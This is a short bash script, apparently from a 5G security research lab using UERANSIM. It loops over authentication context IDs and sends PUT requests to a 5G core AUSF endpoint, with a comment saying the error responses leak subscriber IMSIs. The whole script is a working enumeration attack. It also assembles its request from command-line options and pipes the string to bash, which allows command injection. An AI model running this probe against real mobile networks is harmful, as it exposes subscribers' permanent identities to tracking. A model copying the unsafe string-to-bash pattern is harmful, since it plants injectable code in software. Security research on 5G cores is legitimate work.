#!/bin/bash

interface="enp0s3"
ausf_ip="10.0.4.1"
start=0
end=10
while getopts "s:e:a:i:" opt; do
        case $opt in
				s) 	
						start="$OPTARG"
						;;
				e)	
						end="$OPTARG"	
						;;
				a)	
						ausf_ip="$OPTARG"
						;;
                i)
                        interface="$OPTARG"
                        ;;
                \?)
                        echo "Invalid option: -$OPTARG, valid options are -s -e (start and end numbers to check sessions for ue imsi), -i (interface to use default enp0s3) and -a (ausf ip) " >&2
                        exit 1
                        ;;
        esac
done

if [[ "$interface" == "enp0s3" ]]; then
	nghttp_call="nghttp --header=':method: PUT' --header='Content-Type: application/json' -d json/ausf_put http://$ausf_ip"
else
	ip=`/home/lily/5G/SHARED/Tools/get_ip_of_ue.sh $interface`
	if [ $? -eq 1 ]; then
		echo $interface " not a valid interface, valid is either enp0s3 or a ue address or name."
		exit 1
	fi
	cd /home/lily/UERANSIM/build
	nghttp_call="./nr-binder $ip nghttp --header=':method: PUT' --header='Content-Type: application/json' -d json/ausf_put http://$ausf_ip"
fi

uri=":7777/nausf-auth/v1/ue-authentications/"

UGreen='\033[0;32m'
UYellow='\033[0;33m'
color_off='\033[0m'


#nghttp --header=':method: PUT' --header='Content-Type: application/json' -d json/ausf_put http://10.0.4.1:7777/nausf-auth/v1/ue-authentications/4/5g-aka-confrimation
#cycle through ints the error messages returns the imsis

for ((i=start; i<=end; i++)); do
	to_call="$nghttp_call$uri$i/5g-aka-confrimation"
	echo -e "$color_off" $to_call
	result=$(echo "$to_call" | bash)
	echo "$result"	
done
